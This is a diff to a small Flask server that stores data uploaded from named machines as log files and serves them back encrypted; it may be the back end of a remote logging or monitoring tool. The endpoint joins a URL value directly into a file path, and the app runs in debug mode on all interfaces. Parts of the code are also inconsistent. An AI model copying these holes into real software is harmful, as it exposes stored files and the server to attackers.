@@ -29,8 +29,6 @@ def upload_data():
 
     data = request.data
     try:
-        # machine_name = data[:14].decode('utf-8')
-        # machine_folder = create_machine_folder(machine_name)
         decrypted_data =  encrypt_data(data)
         if not decrypted_data:
             logging.info('No data received to the server.')
@@ -45,7 +43,7 @@ def upload_data():
 
     file_path = os.path.join(machine_folder, generate_log_filename())
     with open(file_path, 'a') as f:
-        f.write("--- "+log_data + ' ---\n' + data + '\n' * 2 )
+        f.write("--- "+log_data + ' ---\n' + data + '\n\n!@#$%^&*()\n\n' )
     logging.info('Data saved to ' + file_path)
     return jsonify({"status": "success", "file": file_path}), 200
 
@@ -73,36 +71,36 @@ def list_machines():
     encrypted_machines = [encrypt_data(machine) for machine in machines]
     return jsonify(encrypted_owners, encrypted_machines),200
 
-@app.route('/api/computer_data/<owner_name>', methods=['GET'])
-def computer_data(owner_name):
+@app.route('/api/computer_data/<computer_name>', methods=['GET'])
+def computer_data(computer_name):
     """
     Fetches stored logs for a given machine owner.
 
     Parameters:
-        owner_name (str): Name of the machine owner.
+        computer_name:
 
     Returns:
         JSON response with decrypted logs or an error message.
     """
 
-    try:
-        computer_name = get_machine_name(owner_name)
-    except:
-        return jsonify({'status': False, 'message': 'Machine not found'}), 400
-    data = ''
-    for filename in os.listdir(os.path.join(DATA_FOLDER, computer_name)):
-        if os.path.isfile(os.path.join(DATA_FOLDER, computer_name, filename)):
-            with open(os.path.join(DATA_FOLDER, computer_name, filename), 'r') as file:
-                data += file.read() + '\n\n'
+    data_list = []
+    folder_path = os.path.join(DATA_FOLDER, computer_name)
 
-    return jsonify({"data": encrypt_data(data)}), 200
+    if not os.path.exists(folder_path) or not os.path.isdir(folder_path):
+        return jsonify({"error": "Folder not found"}), 404
+
+    for filename in os.listdir(folder_path):
+        file_path = os.path.join(folder_path, filename)
+        if os.path.isfile(file_path):
+            try:
+                with open(file_path, 'r', encoding='utf-8') as file:
+                    data_list.append(file.read())
+            except Exception as e:
+                return jsonify({"error": f"Failed to read {filename}: {str(e)}"}), 500
+
+    encrypted_data = encrypt_data("\n\n".join(data_list))
+    return jsonify({"data": encrypted_data}), 200
+
 
 if __name__ == '__main__':
     app.run(debug=True , host= '0.0.0.0')
-
-
-
-
-
-
-
